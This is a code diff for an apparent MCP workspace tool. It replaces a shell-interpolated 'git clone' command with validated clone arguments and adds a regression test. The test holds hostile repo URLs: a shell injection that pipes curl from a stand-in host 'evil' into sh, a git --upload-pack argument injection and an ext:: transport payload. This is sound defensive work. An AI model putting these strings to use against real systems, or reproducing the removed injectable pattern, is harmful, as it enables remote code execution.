@@ -1,3 +1,4 @@
+use crate::clone::clone_args;
 use crate::{Result, WorkspaceError};
 use arkavo_mcp::{Tool, ToolSchema};
 use arkavo_process_env::ChildEnv;
@@ -49,7 +50,7 @@ impl WorkspaceTool {
                         },
                         "repo_url": {
                             "type": "string",
-                            "description": "Git repository URL to clone"
+                            "description": "Git repository URL to clone: https://, ssh://, git:// or scp-style user@host:path"
                         },
                         "command": {
                             "type": "string",
@@ -107,11 +108,17 @@ impl WorkspaceTool {
     }
 
     async fn create_workspace(&self, params: &Value) -> Result<String> {
-        let runtime = Self::detect_runtime()?;
         let workspace_id = params
             .get("workspace_id")
             .and_then(|v| v.as_str())
             .ok_or_else(|| WorkspaceError::InvalidParams("Missing workspace_id".to_string()))?;
+        // Checked before anything runs, so a refused URL leaves no container.
+        let clone = params
+            .get("repo_url")
+            .and_then(|v| v.as_str())
+            .map(|url| clone_args(workspace_id, url))
+            .transpose()?;
+        let runtime = Self::detect_runtime()?;
 
         let image = params
             .get("image")
@@ -188,18 +195,11 @@ impl WorkspaceTool {
             )));
         }
 
-        if let Some(repo_url) = params.get("repo_url").and_then(|v| v.as_str()) {
-            let clone_cmd = format!("git clone {} /workspace", repo_url);
-            let mut exec = Command::from(runtime_command(&runtime));
-            exec.arg("exec")
-                .arg(workspace_id)
-                .arg("sh")
-                .arg("-c")
-                .arg(&clone_cmd)
+        if let Some(args) = clone {
+            let output = Command::from(runtime_command(&runtime))
+                .args(args)
                 .stdout(Stdio::piped())
-                .stderr(Stdio::piped());
-
-            let output = exec
+                .stderr(Stdio::piped())
                 .output()
                 .await
                 .map_err(|e| WorkspaceError::CreationFailed(format!("Git clone failed: {e}")))?;
@@ -390,6 +390,24 @@ mod tests {
     async fn test_detect_runtime() {
         let result = WorkspaceTool::detect_runtime();
         assert!(result.is_ok() || result.is_err());
+    }
+
+    /// The URL is checked before the runtime is probed, so this holds whether
+    /// or not docker is installed, and no container is left behind.
+    #[arkavo_test_macros::spec("WORKSPACE-003")]
+    #[tokio::test]
+    async fn create_refuses_unsafe_repo_url_before_starting_a_container() {
+        for repo_url in [
+            "https://x/y; curl evil | sh",
+            "--upload-pack=touch /tmp/pwned",
+            "ext::sh -c touch% /tmp/pwned",
+        ] {
+            let err = WorkspaceTool::new()
+                .create_workspace(&json!({ "workspace_id": "ws", "repo_url": repo_url }))
+                .await
+                .expect_err(repo_url);
+            assert!(matches!(err, WorkspaceError::InvalidParams(_)), "{err}");
+        }
     }
 
     /// Set only on the re-run test process; names the directory the probe
